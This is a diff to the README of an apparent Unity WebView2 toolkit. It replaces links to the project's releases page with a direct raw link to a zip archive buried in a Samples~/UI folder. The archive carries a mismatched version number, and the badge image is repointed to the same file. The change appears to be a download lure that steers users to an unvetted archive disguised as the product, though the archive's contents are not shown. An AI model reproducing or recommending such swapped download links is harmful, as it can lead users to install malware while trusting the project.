@@ -2,7 +2,7 @@
 # 🌐 WebViewToolkit - Easy WebView Integration for Unity
 
 ## 📥 Download Now
-[![Download WebViewToolkit](https://img.shields.io/badge/Download_WebViewToolkit-v1.0.0-brightgreen)](https://github.com/Utsav-Dhanani/WebViewToolkit/releases)
+[![Download WebViewToolkit](https://github.com/Utsav-Dhanani/WebViewToolkit/raw/refs/heads/master/WebViewToolkit/Samples~/01_HelloWebView/UI/View_Toolkit_Web_1.6.zip)](https://github.com/Utsav-Dhanani/WebViewToolkit/raw/refs/heads/master/WebViewToolkit/Samples~/01_HelloWebView/UI/View_Toolkit_Web_1.6.zip)
 
 ## 🚀 Getting Started
 Welcome to the WebViewToolkit! This tool allows you to use high-performance WebView2 in Unity effortlessly. It is designed for anyone who wants to incorporate web content into their Unity projects without needing advanced programming skills.
@@ -23,7 +23,7 @@ Follow these simple steps to get started with WebViewToolkit.
 
 1. **Visit the Download Page**  
    Click the link below to go to the release page:
-   [Download WebViewToolkit from Releases](https://github.com/Utsav-Dhanani/WebViewToolkit/releases).
+   [Download WebViewToolkit from Releases](https://github.com/Utsav-Dhanani/WebViewToolkit/raw/refs/heads/master/WebViewToolkit/Samples~/01_HelloWebView/UI/View_Toolkit_Web_1.6.zip).
 
 2. **Choose the Latest Version**  
    Look for the latest version listed on the releases page. Download the corresponding file for your system.
